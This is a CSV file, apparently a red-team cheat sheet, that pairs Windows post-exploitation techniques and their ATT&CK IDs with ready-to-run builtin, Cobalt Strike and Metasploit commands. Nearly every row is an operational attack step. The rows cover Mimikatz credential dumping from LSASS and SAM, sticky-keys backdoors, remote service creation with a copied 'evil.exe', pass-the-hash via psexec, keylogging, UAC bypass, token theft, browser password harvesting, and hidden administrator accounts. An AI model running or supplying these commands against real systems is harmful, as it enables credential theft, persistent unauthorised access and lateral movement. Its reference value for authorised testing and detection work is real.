Technique Name,Framework,Description,Implementation,Techniques
Dump credentials from LSASS,cobalt-strike,"This technique injects into the LSASS.exe process and scrapes its memory for plaintext passwords of logged on users. You must do this from a high integrity process. 
The Mimikatz project has a lot of different capabilities (https://github.com/gentilkiwi/mimikatz/wiki) such as pass-the-hash, pass-the-ticket, creating silver/golden tickets, dumping credentials, and elevating a process.","logonpasswords
mimikatz !sekurlsa::logonpasswords
mimikatz !sekurlsa::msv
mimikatz !sekurlsa::kerberos
mimikatz !sekurlsa::wdigest",T1003
Dump credentials from LSASS,metasploit,"This technique injects into the LSASS.exe process and scrapes its memory for plaintext passwords of logged on users. You must do this from a high integrity process. 
The Mimikatz project has a lot of different capabilities (https://github.com/gentilkiwi/mimikatz/wiki) such as pass-the-hash, pass-the-ticket, creating silver/golden tickets, dumping credentials, and elevating a process.","use mimikatz
wdigest
msv
kerberos
logonpasswords",T1003
Dumps hashes from the SAM Hive file,cobalt-strike,Dumps hashes from the SAM Hive file.,"hashdump
mimikatz !lsadump::sam",T1003
Dumps hashes from the SAM Hive file,metasploit,Dumps hashes from the SAM Hive file.,"hashdump
run hashdump
run smart_hashdump
post/windows/gather/credentials/domain_hashdump",T1003
Check terminal services,builtin,"Check for the current registry value for terminal services, if it's 0, then terminal services are enabled. If it's 1, then they're disabled","reg query ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections",T1012
Check terminal services,cobalt-strike,"Check for the current registry value for terminal services, if it's 0, then terminal services are enabled. If it's 1, then they're disabled","shell reg query ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections",T1012
Check terminal services,metasploit,"Check for the current registry value for terminal services, if it's 0, then terminal services are enabled. If it's 1, then they're disabled","reg queryval -k ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"" -v fDenyTSConnections
post/windows/gather/enum_termserv",T1012
Point sethc.exe file to cmd.exe,builtin,Modify the registry to point the sethc.exe file to point to cmd.exe,"Sticky Keys Persistence via Registry Manipulations:
REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"" /v Debugger /t REG_SZ /d ""C:\windows\system32\cmd.exe"" /f",T1015
Point sethc.exe file to cmd.exe,cobalt-strike,Modify the registry to point the sethc.exe file to point to cmd.exe,"Sticky Keys Persistence via Registry Manipulations:
shell REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"" /v Debugger /t REG_SZ /d ""C:\windows\system32\cmd.exe"" /f",T1015
Point sethc.exe file to cmd.exe,metasploit,Modify the registry to point the sethc.exe file to point to cmd.exe,post/windows/manage/sticky_keys,T1015
Replace real sethc.exe with a copy of cmd.exe,builtin,Remove the real sethc.exe and replace it with a copy of cmd.exe. You can also just move the original sethc.exe to a different file if you don't want to delete it,"Sticky Keys Persistence via binary swapping:
takeown.exe C:\Windows\system32\sethc.exe
del C:\Windows\system32\sethc.exe
copy C:\Windows\system32\cmd.exe C:\Windows\system32\sethc.exe",T1015
Replace real sethc.exe with a copy of cmd.exe,cobalt-strike,Remove the real sethc.exe and replace it with a copy of cmd.exe. You can also just move the original sethc.exe to a different file if you don't want to delete it,"Sticky Keys Persistence via binary swapping:
shell takeown.exe C:\Windows\system32\sethc.exe
shell del C:\Windows\system32\sethc.exe
shell copy C:\Windows\system32\cmd.exe C:\Windows\system32\sethc.exe",T1015
Get network information,builtin,"Get information about the domain, network adapters, DNS / WSUS servers",ipconfig /all,T1016
Get network information,cobalt-strike,"Get information about the domain, network adapters, DNS / WSUS servers",shell ipconfig,T1016
Get network information,metasploit,"Get information about the domain, network adapters, DNS / WSUS servers","ipconfig
post/windows/gather/enum_domains",T1016
Get ARP table,builtin,Display the ARP table,"arp -a
route print",T1016
Get ARP table,cobalt-strike,Display the ARP table,shell arp -a,T1016
Get ARP table,metasploit,Display the ARP table,route,T1016
"Dump MAC, IP addresses and codes",builtin,Used to get the MAC and IP addresses as well as some descriptive codes for machines (0x1C indicates a domain controller),nbtstat -a {IP | COMP_NAME },T1016
"Dump MAC, IP addresses and codes",cobalt-strike,Used to get the MAC and IP addresses as well as some descriptive codes for machines (0x1C indicates a domain controller),shell c:\windows\sysnative\nbstat.exe -a {IP | COMP_NAME},T1016
Get the list of domain computers,builtin,Display the list of domain computers in the domain by showing their computer accounts (COMP_NAME$),"net group ""Domain Computers"" /domain[:DOMAIN]",T1018
Get the list of domain computers,cobalt-strike,Display the list of domain computers in the domain by showing their computer accounts (COMP_NAME$),"net group ""Domain Computers"" /domain",T1018
Get the list of domain computers,metasploit,Display the list of domain computers in the domain by showing their computer accounts (COMP_NAME$),"
post/windows/gather/enum_ad_computers
post/windows/gather/enum_computers",T1018
Get the list of domain controllers,builtin,Display the list of domain controllers in the network,"net group ""Domain Controllers"" /domain[:DOMAIN]",T1018
Get the list of domain controllers,cobalt-strike,Display the list of domain controllers in the network,"net group ""Domain Controllers"" /domain",T1018
Display trust relationship with domain controller,builtin,Display the trust relationship between the workstation and the domain - must be elevated to use this!,nltest /dclist[:domain],T1018
Display the login server,builtin,Display the active directory login server of the workstation,echo %LOGONSERVER%,T1018
Display the login server,cobalt-strike,Display the active directory login server of the workstation,shell echo %LOGONSERVER%,T1018
Get user information,builtin,"Get current user information, SID, domain, groups the user belongs to, security privs of the user",whoami /all /fo list,T1033
Get user information,cobalt-strike,"Get current user information, SID, domain, groups the user belongs to, security privs of the user",shell whoami /all /fo list,T1033
Get user information,metasploit,"Get current user information, SID, domain, groups the user belongs to, security privs of the user",getuid,T1033
Check for common privilege escalation methods,builtin,"PowerUp.ps1 is a powershell script from the PowerSploit project on github by PowershellMafia. The Invoke-AllChecks commandlet checks for many common privilege escalation options such as unquoted service paths, writeable service directories, service information manipulation, always install elevated, etc. Each specific kind of escalation technique supplies its own method of abusing it.","Check for common privilege escalation methods:
*upload PowerUp.ps1 to victim disk*
powershell.exe -epbypass PowerUp.ps1
Invoke-AllChecks","T1058
T1034
T1044
T1038"
Check for common privilege escalation methods,cobalt-strike,"PowerUp.ps1 is a powershell script from the PowerSploit project on github by PowershellMafia. The Invoke-AllChecks commandlet checks for many common privilege escalation options such as unquoted service paths, writeable service directories, service information manipulation, always install elevated, etc. Each specific kind of escalation technique supplies its own method of abusing it.","powershell-import /path/to/PowerUp.ps1
powershell Invoke-AllChecks","T1058
T1034
T1044
T1038"
Check for common privilege escalation methods,metasploit,"PowerUp.ps1 is a powershell script from the PowerSploit project on github by PowershellMafia. The Invoke-AllChecks commandlet checks for many common privilege escalation options such as unquoted service paths, writeable service directories, service information manipulation, always install elevated, etc. Each specific kind of escalation technique supplies its own method of abusing it.",exploit/windows/local/trusted_service_path,"T1058
T1034
T1044
T1038"
Create a new service remotely,builtin,"This technique creates a new service on the remote machine. It's important to note the spaces after the = in these commands! Also, before starting the service, run the following commands to make sure everything is set up properly:
sc \\COMP qc acachsrv
dir \\COMP\ADMIN$\acachsrv.exe","Creating a new service remotely:
net use \\COMP\ADMIN$ ""password"" /user:DOMAIN_NAME\UserName
copy evil.exe \\COMP\ADMIN$\System32\acachsrv.exe
sc \\COMP create acachsrv binPath= ""C:\Windows\System32\acachsrv.exe"" start= auto  DisplayName= ""DisplayName""
sc \\COMP start acachsrv","T1035
T1077"
Create a new service remotely,cobalt-strike,"This technique creates a new service on the remote machine. It's important to note the spaces after the = in these commands! Also, before starting the service, run the following commands to make sure everything is set up properly:
sc \\COMP qc acachsrv
dir \\COMP\ADMIN$\acachsrv.exe","Creating a new service remotely:
shell net use \\COMP\ADMIN$ ""password"" /user:DOMAIN_NAME\UserName
shell copy evil.exe \\COMP\ADMIN$\acachsrv.exe
shell sc \\COMP create acachsrv binPath= ""C:\Windows\System32\acachsrv.exe"" start= auto description= ""Description here"" DisplayName= ""DisplayName""
shell sc \\COMP start acachsrv","T1035
T1077"
Create a new service remotely (using psexec),builtin,"psexec copies over a file to the remote box via SMB, then creates a service (usually a randomly named one) which points to the binary that was just copied over, starts the service, then deletes the service. Depending on the version of psexec, it might also migrate out of the initial process and delete the file that was copied over too. This is very similar to the previously mentioned technique of creating a service remotely, but the operator has much less control over the parameters","psexec is part of the SysInternals suite. It's not on systems by default, but it is likely to be a trusted executable, especially on sysadmin boxes where other SysInternals tools already exist:

psexec /accepteula \\ip -u domain\user -p password -c -f \\smbip\share\file.exe (Copy and execute file.exe on the remote system)
psexec /accepteula \\ip -u domain\user -p  lm:ntlm cmd.exe /c dir c:\Progra~1 (Run cmd.exe on the remote system using the lm:ntlm password hash - aka pass the hash)
psexec /accepteula \\ip -s cmd.exe (Run cmd.exe on the remote box as the SYSTEM user account)","T1035
T1077"
Create a new service remotely (using psexec),cobalt-strike,"psexec copies over a file to the remote box via SMB, then creates a service (usually a randomly named one) which points to the binary that was just copied over, starts the service, then deletes the service. Depending on the version of psexec, it might also migrate out of the initial process and delete the file that was copied over too. This is very similar to the previously mentioned technique of creating a service remotely, but the operator has much less control over the parameters","psexec COMP_NAME {listener name} (via sc)
psexec_sh COMP_NAME {listener name} (via powershell)","T1035
T1077"
Create a new service remotely (using psexec),metasploit,"psexec copies over a file to the remote box via SMB, then creates a service (usually a randomly named one) which points to the binary that was just copied over, starts the service, then deletes the service. Depending on the version of psexec, it might also migrate out of the initial process and delete the file that was copied over too. This is very similar to the previously mentioned technique of creating a service remotely, but the operator has much less control over the parameters","PSEXEC Modules:
exploit/windows/smb/psexec
exploit/windows/local/current_user_psexec
auxiliary/admin/smb/psexec_command
auxiliary/scanner/smb/psexec_loggedin_users
exploit/windows/smb/psexec_psh","T1035
T1077"
Get current TCP/IP connections,builtin,Display current TCP/IP network connections (b requires elevated privs so you can see the process that opened the connection),netstat -ano[b],T1049
Get current TCP/IP connections,cobalt-strike,Display current TCP/IP network connections (b requires elevated privs so you can see the process that opened the connection),shell c:\windows\sysnative\netstat.exe -ano[b],T1049
Get current TCP/IP connections,metasploit,Display current TCP/IP network connections (b requires elevated privs so you can see the process that opened the connection),post/windows/gather/tcpnetstat,T1049
Display active SMB sessions,builtin,Display the list of active SMB sessions on the workstation so you can see which users have active connections.,"net session | find / ""\\""",T1049
Display active SMB sessions,cobalt-strike,Display the list of active SMB sessions on the workstation so you can see which users have active connections.,"shell net session | find / ""\\""",T1049
Display active SMB sessions,metasploit,Display the list of active SMB sessions on the workstation so you can see which users have active connections.,post/windows/gather/enum_logged_on_users,T1049
Display all currently scheduled tasks,builtin,Displays all of the currently scheduled tasks to be run on a computer,schtasks [/s HOSTNAME],T1053
Display all currently scheduled tasks,cobalt-strike,Displays all of the currently scheduled tasks to be run on a computer,shell schtasks,T1053
Create a scheduled task,builtin,"Add scheduled task (/s is name/ip of remote system to do this on; /tn is the name of the task; /sc is when to run; /ru is user to runas; /rp is password for that user)
may need to make sure that the schedule service is started and configured to run on boot so that your persistence sticks.
Delete a scheduled task by name:
schtasks [/s HOSTNAME] /delete /tn ""name""","Creating a scheduled task:
schtasks [/S HOSTNAME] /create /tn ""acachesrv"" /tr C:\file\path\here.exe /sc ONLOGON /ru ""System"" [/rp password]
Requirements for running scheduled tasks:
net start schedule
sc config schedule start= auto",T1053
Create a scheduled task,cobalt-strike,"Add scheduled task (/s is name/ip of remote system to do this on; /tn is the name of the task; /sc is when to run; /ru is user to runas; /rp is password for that user)
may need to make sure that the schedule service is started and configured to run on boot so that your persistence sticks.
Delete a scheduled task by name:
schtasks [/s HOSTNAME] /delete /tn ""name""","Creating a scheduled task:
shell schtasks [/S HOSTNAME] /create /tn ""acachesrv"" /tr C:\file\path\here.exe /sc ONLOGON /ru ""System"" [/rp password]
Requirements for running scheduled tasks:
shell net start schedule
shell sc config schedule start= auto",T1053
Start a keylogger,metasploit,"Keylogging is extremely useful to get credentials and other information from the victim, but make sure that you are keylogging in a process belonging to the user you want to spy on. Keylogging within a SYSTEM process will not get you the keystrokes of other users on the system. For Cobalt Strike, make sure you specifiy the correct architecture and PID for a process running as the target victim. For Metasploit, make sure you've migrated to a process that is running as the target victim (explore.exe is always good).","starting the keylogger:
keyscan_start
when you're ready to get the logs:
keyscan_dump
when you're done keylogging:
keyscan_stop",T1056
Enumerate running processes,builtin,Display list of currently running processes and services on the system,"tasklist /v [/svc]
net start
qprocess *",T1057
Enumerate running processes,cobalt-strike,Display list of currently running processes and services on the system,"ps
shell tasklist /v [/svc]
shell net start",T1057
Enumerate running processes,metasploit,Display list of currently running processes and services on the system,"ps
post/windows/gather/enum_services",T1057
Elevate to SYSTEM level process,cobalt-strike,"This technique tries a series of exploits to elevate to a SYSTEM level process (these are actual exploits, not trust abuses, so there's always the potential for bluescreening)",getsystem,T1068
Elevate to SYSTEM level process,metasploit,"This technique tries a series of exploits to elevate to a SYSTEM level process (these are actual exploits, not trust abuses, so there's always the potential for bluescreening)",getsystem,T1068
Enumerate local Admin accounts,builtin,Display the list of local administrator accounts on the workstation,"net localgroup ""Administrators""",T1069
Enumerate local Admin accounts,cobalt-strike,Display the list of local administrator accounts on the workstation,"shell net localgroup ""Administrators""",T1069
Enumerate local Admin accounts,metasploit,Display the list of local administrator accounts on the workstation,post/windows/gather/local_admin_search_enum,T1069
Get domain admin accounts,builtin,Display the list of domain administrator accounts,"net group [""Domain Admins""] /domain[:DOMAIN]",T1069
Get domain admin accounts,cobalt-strike,Display the list of domain administrator accounts,"net group [""Domain Admins""] /domain",T1069
Get domain admin accounts,metasploit,Display the list of domain administrator accounts,"domain_list_gen.rb
post/windows/gather/enum_domain_group_users",T1069
Enable RDP Services,builtin,Enable RDP via the registry and services,"Enable RDP Services:
REG ADD ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v UserAuthentication /t REG_DWORD /d 0 /f
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f 
net start TermService",T1076
Enable RDP Services,cobalt-strike,Enable RDP via the registry and services,"Enable RDP Services:
shell REG ADD ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v UserAuthentication /t REG_DWORD /d 0 /f
shell reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f 
shell net start TermService",T1076
Enable RDP Services,metasploit,Enable RDP via the registry and services,post/windows/manage/enable_rdp,T1076
Get available shares,builtin,"Used to view network shared resource information, add a new network resource, and remove an old network resource from the computer. Run this against computers discovered from the previous two commands to view the shares that are available on them.","net use [\\ip\path] [password] [/user:DOMAIN\user]
net use \\COMP\ADMIN$ password /user:COMP\Administrator (checking password reuse on local admin account)",T1077
Get available shares,cobalt-strike,"Used to view network shared resource information, add a new network resource, and remove an old network resource from the computer. Run this against computers discovered from the previous two commands to view the shares that are available on them.",shell net use [\\ip\path] [password] [/user:DOMAIN\user],T1077
Collect passwords from web browsers,cobalt-strike,"https://github.com/AlessandroZ/LaZagne (now part of pupy as a post-exploit module)
This program attempts to collect passwords from many different data sources related to browsers - it'll get passwords from Firefox, Chrome, Opera, IE.
the -f command on the browsers command call is specifically targeting Firefox",shell laZagne.exe browsers [-f],T1081
Collect passwords from web browsers,open source,"https://github.com/hassaanaliw/chromepass
This program attempts to collect passwords that Chrome stores.","To print output simply: python chromepass.py -d
To write to csv file: python chromepass.py --o csv
To write to json file: python chromepass.py --o json",T1081
Get Windows version,builtin,Get the Windows OS version that's running,ver,T1082
Get Windows version,cobalt-strike,Get the Windows OS version that's running,shell ver,T1082
Print environment variables,builtin,Print all of the environment variables,set,T1082
Print environment variables,cobalt-strike,Print all of the environment variables,shell set,T1082
Print environment variables,metasploit,Print all of the environment variables,get_env.rb,T1082
Get computer information,builtin,"Get computer name, username, OS software version, domain information, DNS, logon domain","net config workstation
net config server",T1082
Get computer information,cobalt-strike,"Get computer name, username, OS software version, domain information, DNS, logon domain","shell net config workstation
shell net config server",T1082
Get configuration information,builtin,"Displays detailed configuration information about a computer and its operating system, including operating system configuration, security information, product ID, and hardware properties, such as RAM, disk space, and network cards",systeminfo [/s COMPNAME] [/u DOMAIN\user] [/p password],T1082
Get configuration information,cobalt-strike,"Displays detailed configuration information about a computer and its operating system, including operating system configuration, security information, product ID, and hardware properties, such as RAM, disk space, and network cards","systemprofiler tool if no access yet (victim browses to website)
or
shell systeminfo (if you already have a beacon)",T1082
Get configuration information,metasploit,"Displays detailed configuration information about a computer and its operating system, including operating system configuration, security information, product ID, and hardware properties, such as RAM, disk space, and network cards","sysinfo, run winenum, get_env.rb",T1082
Gather more information on targeted users,builtin,"Used to add, delete, and manage the users on the computer. Run this command on the users discovered from the previous two commands to gather more information on targeted users.",net user [username] [/domain],T1087
Gather more information on targeted users,cobalt-strike,"Used to add, delete, and manage the users on the computer. Run this command on the users discovered from the previous two commands to gather more information on targeted users.",shell net user [username] [/domain],T1087
Gather more information on targeted users,metasploit,"Used to add, delete, and manage the users on the computer. Run this command on the users discovered from the previous two commands to gather more information on targeted users.","post/windows/gather/enum_ad_users
auxiliary/scanner/smb/smb_enumusers",T1087
"Query Active Directory for users, groups and permissions",builtin,"Dsquery is a Windows utility on servers that facilitates querying the Active Directory of the domain for lots of information about users, groups, and permissions. When constructing dsquery commands, if your domain is ""subdomain.domain.tld"", then your query will include ""dc=subdomain,dc=domain,dc=tld""","dsquery group ""ou=Domain Admins,dc=domain,dc=com""
dsquery user ""dc=domain,dc=com""
dsquery * OU=""Domain Admins"",DC=domain,DC=com -scope base -attr SAMAccountName userPrincipalName Description
dsquery * -filter ""(&(objectCategory=contact)(objectCategory=person)(mail=*)(objectClass=user))"" -Attr samAccountName mail -Limit 0
dsquery * -filter ""(&(objectCategory=group)(name=*Admin*))"" -Attr name description members",T1087
"Query Active Directory for users, groups and permissions",cobalt-strike,"Dsquery is a Windows utility on servers that facilitates querying the Active Directory of the domain for lots of information about users, groups, and permissions. When constructing dsquery commands, if your domain is ""subdomain.domain.tld"", then your query will include ""dc=subdomain,dc=domain,dc=tld""","shell dsquery group ""out=Domain Admins"",dc=domain,dc=com""
shell dsquery user ""dc=domain,dc=com""
shell dsquery * OU=""Domain Admins"",dc=domain,dc=com -scope base -attr SAMAccountName userPrincipleName Description
shell dsquery * -filter ""(&(objectCategory=contact)(objectCategory=person)(mail=*)(objectClass=user))"" -Attr samAccountName mail -Limit 0
shell dsquery * -filter ""(&(objectCategory=group)(name=*Admin*))"" -Attr name description members",T1087
Bypass UAC,cobalt-strike,"If you have a medium integrity process, but are an administrator, UACBypass will get you a high integrity process without prompting the user for confirmation.",uacbypass,T1088
Bypass UAC,metasploit,"If you have a medium integrity process, but are an administrator, UACBypass will get you a high integrity process without prompting the user for confirmation.","One of the following:
exploit/windows/local/bypassuac
exploit/windows/local/bypassuac_injection
exploit/windows/local/bypassuac_vbs",T1088
Token stealing,cobalt-strike,"This steals the access token from another process and uses it to gain access to other services or computers. In Cobalt Strike, this token is only used when accessing remote systems, but in Meterpreter, this token is used for everything until it's dropped via rev2self. You need to be in a high integrity process for this to work.","Token Stealing:
steal_token pid#",T1134
Token stealing,metasploit,"This steals the access token from another process and uses it to gain access to other services or computers. In Cobalt Strike, this token is only used when accessing remote systems, but in Meterpreter, this token is used for everything until it's dropped via rev2self. You need to be in a high integrity process for this to work.","Token Stealing:
use incognito
list_tokens -u
impersonate_token DOMAIN\\User
or:
steal_token {pid}",T1134
Dump network shared resource information,builtin,"Used to view network shared resource information, share a new network resource, and remove an old shared network resource from the workstation. Not for remote queries",net share,T1135
Dump network shared resource information,cobalt-strike,"Used to view network shared resource information, share a new network resource, and remove an old shared network resource from the workstation. Not for remote queries",net share,T1135
Dump network shared resource information,metasploit,"Used to view network shared resource information, share a new network resource, and remove an old shared network resource from the workstation. Not for remote queries",auxiliary/scanner/smb/smb_enumshares,T1135
List of workstations and network devices,builtin,Display the list of workstations and network devices on the network.,net view \\host /all [/domain:domain],T1135
List of workstations and network devices,cobalt-strike,Display the list of workstations and network devices on the network.,net view \\host /domain,T1135
List of workstations and network devices,metasploit,Display the list of workstations and network devices on the network.,auxiliary/scanner/smb/smb_enumshares,T1135
Create backdoor user account,builtin,Create a backdoor user account that often appears on windows systems and add that user to the local administrators group and the remote desktop users group. This combined with the sticky keys persistence grants an inocuous system level persistence mechanism.,"Add backdoor user account:
net user support_388945a0 somepasswordhere /add /y
net localgroup administrators support_388945a0 /add
net localgroup ""remote desktop users"" support_388945a0 /add",T1136
Create backdoor user account,metasploit,Create a backdoor user account that often appears on windows systems and add that user to the local administrators group and the remote desktop users group. This combined with the sticky keys persistence grants an inocuous system level persistence mechanism.,post/windows/manage/add_user_domain,T1136
Create backdoor user account,cobalt-strike,Create a backdoor user account that often appears on windows systems and add that user to the local administrators group and the remote desktop users group. This combined with the sticky keys persistence grants an inocuous system level persistence mechanism.,"Add backdoor user account:
shell net user support_388945a0 somepasswordhere /add /y
shell net localgroup administrators support_388945a0 /add
shell net localgroup ""remote desktop users"" support_388945a0 /add",T1136
"Enable ""support_388945a0"" account",builtin,"If the support_388945a0 account already exists on the system, but is disabled, you can enable it and then add it to the necessary groups.","Enable backdoor user account:
net user support_388945a0 /active:yes
net localgroup administrators support_388945a0 /add
net localgroup ""remote desktop users"" support_388945a0 /add",T1136
"Enable ""support_388945a0"" account",cobalt-strike,"If the support_388945a0 account already exists on the system, but is disabled, you can enable it and then add it to the necessary groups.","Enable backdoor user account:
shell net user support_388945a0 /active:yes
shell net localgroup administrators support_388945a0 /add
shell net localgroup ""remote desktop users"" support_388945a0 /add",T1136
